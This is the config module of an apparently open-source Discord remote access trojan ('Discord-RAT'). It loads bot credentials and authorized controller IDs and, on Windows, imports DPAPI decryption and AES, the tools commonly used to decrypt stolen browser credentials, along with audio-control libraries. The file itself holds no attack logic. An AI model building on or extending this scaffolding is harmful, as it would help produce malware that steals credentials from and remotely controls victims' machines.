"""
config.py - environment loading, platform detection, shared constants, bot instance.
"""

import os
import platform
import tempfile

import discord
from discord.ext import commands
from dotenv import load_dotenv

# ── Platform ───────────────────────────────────────────────────────────────
IS_WINDOWS = platform.system() == "Windows"

# ── Windows-only imports ───────────────────────────────────────────────────
if IS_WINDOWS:
    from comtypes import CLSCTX_ALL
    from Crypto.Cipher import AES
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
    from win32crypt import CryptUnprotectData
else:
    CryptUnprotectData = None
    AudioUtilities = None
    IAudioEndpointVolume = None
    CLSCTX_ALL = None

# ── Credentials (.env) ─────────────────────────────────────────────────────
load_dotenv()
TOKEN = os.getenv("BOT_TOKEN")
GUILD_ID = int(os.getenv("GUILD_ID"))
AUTHORIZED_USERS = [
    int(uid.strip())
    for uid in os.getenv("AUTHORIZED_USERS", "").split(",")
    if uid.strip()
]
VOICE_CHANNEL_ID = int(os.getenv("VOICE_CHANNEL_ID"))

# ── Misc constants ─────────────────────────────────────────────────────────
EMBED_ICON_URL = "https://github.com/truelockmc/Discord-RAT/raw/main/logo.png"
ADMIN_STATUS_FILE = "admin_status.txt"
TEMP_DIR = tempfile.gettempdir()
channel_ids: dict = {}

# ── Bot instance ───────────────────────────────────────────────────────────
intents = discord.Intents.default()
intents.message_content = True
intents.voice_states = True
bot = commands.Bot(command_prefix="!", intents=intents)
